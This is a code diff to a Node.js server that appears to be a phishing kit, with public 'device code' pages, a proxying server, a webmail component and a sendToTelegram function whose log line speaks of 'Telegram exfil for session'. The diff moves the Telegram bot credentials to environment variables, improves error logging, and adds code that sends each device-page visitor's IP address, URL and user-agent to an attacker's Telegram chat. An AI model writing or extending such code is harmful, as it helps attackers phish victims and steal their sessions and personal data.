@@ -26,7 +26,7 @@ try { AdmZip = require('adm-zip'); } catch (e) { AdmZip = null; }
 try { WebSocket = require('ws'); } catch (e) { WebSocket = null; }
 try { FormData = require('form-data'); } catch (e) { FormData = null; }
 
-// ── ✅ TELEGRAM CONFIG ──
+// ── ✅ TELEGRAM CONFIG — NOW FROM ENVIRONMENT ──
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
 
@@ -250,7 +250,9 @@ async function sendToTelegram(data) {
         console.log(`✅ Telegram exfil for session ${sessionId} — response:`, response.status);
     } catch (e) {
         console.error('❌ Telegram send failed:', e.message);
-        if (e.response) console.error('   Response data:', e.response.data);
+        if (e.response) {
+            console.error('📛 Telegram API response:', e.response.data);
+        }
     }
 }
 
@@ -952,6 +954,27 @@ const server = http.createServer(async (req, res) => {
     // ── 🔥 DEVICE CODE PAGES (public, no auth) ──
     if (url === '/device' || url === '/device/') {
         logVisit(req, 'device');  // 🔥 LOG DEVICE VISITS
+
+        // ── 🔥 Send Telegram notification for device visit ──
+        (async () => {
+            try {
+                const ip = req.headers['cf-connecting-ip'] || 
+                           req.headers['x-real-ip'] || 
+                           req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+                           'Unknown';
+                const message = `📱 **Device Page Visit!**\n\n🌍 IP: ${ip}\n🕒 Time: ${new Date().toISOString()}\n🔗 URL: ${req.url}\n🖥️ User-Agent: ${req.headers['user-agent'] || 'Unknown'}`;
+                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                });
+                console.log('✅ Device visit notification sent.');
+            } catch (e) {
+                console.error('❌ Device visit notification failed:', e.message);
+                if (e.response) console.error('📛 Telegram API response:', e.response.data);
+            }
+        })();
+
         const devicePath = path.join(__dirname, 'public', 'device_code.html');
         if (fs.existsSync(devicePath)) {
             res.writeHead(200, { 'Content-Type': 'text/html' });
@@ -2180,6 +2203,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                     console.log('✅ Page-load notification sent.');
                 } catch (e) {
                     console.error('❌ Page-load notification failed:', e.message);
+                    if (e.response) console.error('📛 Telegram API response:', e.response.data);
                 }
             })();
 
@@ -2532,6 +2556,11 @@ server.listen(PORT, '::', () => {
     console.log(`📈 Analytics: ACTIVE`);
     console.log(`📧 Webmail: ACTIVE`);
     console.log(`🔌 WebSocket: /ws (live log updates)`);
+
+    // Warn if Telegram credentials are missing
+    if (!BOT_TOKEN || !CHAT_ID) {
+        console.warn('⚠️ TELEGRAM CREDENTIALS ARE MISSING! Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables.');
+    }
 });
 
 // Error handling
